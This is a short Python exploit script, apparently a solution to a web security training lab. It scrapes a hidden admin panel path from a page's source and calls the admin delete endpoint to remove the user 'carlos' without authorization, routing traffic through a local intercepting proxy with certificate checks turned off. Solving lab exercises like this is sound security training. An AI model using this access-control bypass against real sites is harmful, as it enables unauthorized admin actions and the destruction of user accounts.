import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def delete_user(url):
    r = requests.get(url, proxies=proxies, verify=False)

    # Retrive session cookie
    session_cookie = r.cookies.get_dict().get("session")

    # Retrieve the admin path
    soup = BeautifulSoup(r.text, "lxml")
    admin_instances = soup.find(text=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)

    # Delete user 'carlos'
    cookies = {"session": session_cookie}
    delete_carlos_url = url + admin_path + "/delete?username=carlos"
    r = requests.get(delete_carlos_url, cookies=cookies, proxies=proxies, verify=False)
    if r.status_code == 200:
        print("(+) User 'carlos' deleted successfully.")
    else:
        print("(-) Failed to delete user 'carlos'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting user 'carlos'...")
    delete_user(url)

if __name__ == "__main__":
    main()